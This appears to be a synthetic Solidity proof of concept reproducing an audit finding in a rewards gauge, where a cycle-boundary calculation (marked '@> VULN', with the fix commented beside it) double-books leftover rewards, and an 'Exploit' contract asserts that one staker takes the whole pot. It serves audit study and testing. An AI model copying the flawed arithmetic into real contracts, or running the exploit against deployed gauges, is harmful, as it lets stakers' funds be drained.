// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — getNextCycleStart is one duration late at a cycle boundary
    (Pashov H-30, finding 66371, AuditVault duplicate id of the same report). SYNTHETIC, cheatcode-free.
    At an exact boundary the helper returns timestamp + DURATION instead of
    timestamp, so periodFinish becomes timestamp + 2*DURATION. Leftover rewards
    are booked for two weeks while the gauge holds one week of tokens.
    Staker A is paid the whole pot. Staker B is paid 0. Line preserved (@> VULN). */

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract StakerB {}

contract GaugeRewardsDistributor {
    uint256 public constant DURATION = 7 days;
    uint256 public constant RATE = 1e12;

    MockToken public token;
    uint256 public firstCycleStart;
    uint256 public periodFinish;
    uint256 public rate;
    uint256 public leftover;
    address public stakerA;
    address public stakerB;
    uint256 public paidA;
    uint256 public paidB;

    constructor(MockToken t) {
        token = t;
    }

    function syncBoundary(address a, address b) external {
        require(block.timestamp >= DURATION, "ts");
        firstCycleStart = block.timestamp - DURATION; // S0 exact end of cycle 1
        rate = RATE;
        stakerA = a;
        stakerB = b;
    }

    function getNextCycleStart() public view returns (uint256) {
        if (block.timestamp < firstCycleStart) {
            return firstCycleStart;
        }
        uint256 timeElapsedSinceFirst = block.timestamp - firstCycleStart;
        return firstCycleStart + ((timeElapsedSinceFirst / DURATION) + 1) * DURATION; // @> VULN: floor division at an exact boundary skips the cycle that is starting now
        // FIX: completedCycles = (timeElapsedSinceFirst + DURATION - 1) / DURATION;
        // FIX: return firstCycleStart + completedCycles * DURATION;
    }

    function getNextCycleStartFixed() public view returns (uint256) {
        if (block.timestamp < firstCycleStart) return firstCycleStart;
        uint256 timeElapsedSinceFirst = block.timestamp - firstCycleStart;
        uint256 completedCycles = (timeElapsedSinceFirst + DURATION - 1) / DURATION;
        return firstCycleStart + completedCycles * DURATION;
    }

    function roll() external {
        uint256 timestamp = block.timestamp;
        uint256 next = getNextCycleStart();
        periodFinish = next + DURATION; // report: finish lands at timestamp + 2*DURATION
        uint256 remaining = periodFinish - timestamp;
        leftover = remaining * rate; // S3 two weeks of rewards booked
    }

    function _take(address to, uint256 each) internal returns (uint256 pay) {
        uint256 bal = token.balanceOf(address(this));
        pay = each > bal ? bal : each;
        if (pay > 0) token.transfer(to, pay); // S5
    }

    function settle() external {
        uint256 each = leftover / 2;
        paidA = _take(stakerA, each);
        paidB = _take(stakerB, each); // S6
    }
}

contract Exploit {
    MockToken public token; // nonce 1
    StakerB public stakerB; // nonce 2
    GaugeRewardsDistributor public gauge; // nonce 3

    constructor() {
        token = new MockToken();
        stakerB = new StakerB();
        gauge = new GaugeRewardsDistributor(token);
        token.mint(address(gauge), 7 days * 1e12);
    }

    function run() external {
        gauge.syncBoundary(address(this), address(stakerB));
        gauge.roll(); // S1
        gauge.settle(); // S4
        require(gauge.leftover() == 2 * 7 days * 1e12, "leftover doubled");
        require(gauge.periodFinish() == block.timestamp + 14 days, "cycle extended");
        require(token.balanceOf(address(this)) == 7 days * 1e12, "A took the whole week");
        require(gauge.paidB() == 0, "B paid nothing");
        require(token.balanceOf(address(stakerB)) == 0, "B received 0");
        require(token.balanceOf(address(gauge)) == 0, "pot empty");
    }
}
